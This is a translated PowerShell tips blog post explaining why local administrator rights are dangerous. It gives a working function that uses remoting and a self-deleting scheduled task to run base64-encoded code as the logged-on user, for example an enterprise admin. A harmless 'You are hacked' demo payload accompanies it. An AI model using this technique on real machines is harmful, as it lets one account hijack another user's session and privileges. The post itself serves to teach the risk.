---
layout: post
date: 2018-09-28 00:00:00
title: "PowerShell 技能连载 - 以其他用户身份运行 PowerShell 代码"
description: PowerTip of the Day - Running PowerShell Code as Someone Else
categories:
- powershell
- tip
tags:
- powershell
- tip
- powertip
- series
---
本地管理员权限十分强大，您需要使用类似 JEA 等技术来尽可能减少本地管理员的数量。为什么？请看以下示例。如果您有某台机器上的本地管理员特权，而且启用了 PowerShell 远程操作，那么您可以发送任意的 PowerShell 代码到那台机器上，并且以登录到那台机器上的用户的上下文执行该代码。

如果一个企业管理员正坐在该机器前，您作为一个本地管理员也可以发送一行 PowerShell 代码，并以企业管理员的身份执行。

在操作之前：请知道自己在做什么。这个示例演示了计划任务和本地管理员权限的技术可能性。这些与 PowerShell 和 PowerShell 远程操作都没有关系。我们只是使用 PowerShell 作为工具。

您可以在没有 PowerShell 和 PowerShell 远程操作的情况下做相同的事情，只是使用纯 cmd 以及 `psexec` 等工具。

```powershell
function Invoke-PowerShellAsInteractiveUser 
{
    param(
        [Parameter(Mandatory)]
        [ScriptBlock]
        $ScriptCode,
    
        [Parameter(Mandatory)]
        [String[]]
        $Computername
    )

    # this runs on the target computer
    $code = { 
      
        param($ScriptCode)

        # turn PowerShell code into base64 stream
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($ScriptCode)
        $encodedCommand = [Convert]::ToBase64String($bytes)
        
        # find out who is physically logged on
        $os = Get-WmiObject -Class Win32_ComputerSystem
        $username = $os.UserName

        # define a scheduled task in the interactive user context
        # with highest privileges
        $xml = @"  
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo />
  <Triggers />
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings />
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-windowstyle minimized -encodedCommand $EncodedCommand</Arguments>
    </Exec>
  </Actions>
  <Principals>
    <Principal id="Author">
      <UserId>$username</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
</Task>
"@
      
        # define, run, then delete the scheduled job          
        $jobname = 'remotejob' + (Get-Random)
        $xml | Out-File -FilePath "$env:temp\tj1.xml"
        $null = schtasks.exe /CREATE /TN $jobname /XML $env:temp\tj1.xml 
        Start-Sleep -Seconds 1
        $null = schtasks.exe /RUN /TN $jobname 
        $null = schtasks.exe /DELETE /TN $jobname  /F 
    }
    
    # run the code on the target machine, and submit the PowerShell code to execute
    Invoke-Command -ScriptBlock $code -ComputerName $computername -ArgumentList $ScriptCode
}
```

要将恶意代码发送到另一台机器，例如打开一个可见的浏览器页面，或用这段代码通过文字转语音和用户“聊天”：

```powershell
$ComputerName = 'ENTER THE COMPUTER NAME'

$pirateCode = {
    Start-Process -FilePath www.microsoft.com
    
    $sapi = New-Object -ComObject Sapi.SpVoice
    $sapi.Speak("You are hacked...!")
    Start-Sleep -Seconds 6
}

Invoke-PowerShellAsInteractiveUser -ScriptCode $pirateCode -Computername $ComputerName
```

显然，需要调整 `$ComputerName` 对应到您拥有本地管理员特权，并且启用了 PowerShell 远程操作系统上。并且，这段代码需要用户物理登录。如果没有物理登录的用户，那么将没有可以进入的用户回话，这段代码将会执行失败。

<!--本文国际来源：[Running PowerShell Code as Someone Else](http://community.idera.com/powershell/powertips/b/tips/posts/running-powershell-code-as-someone-else)-->
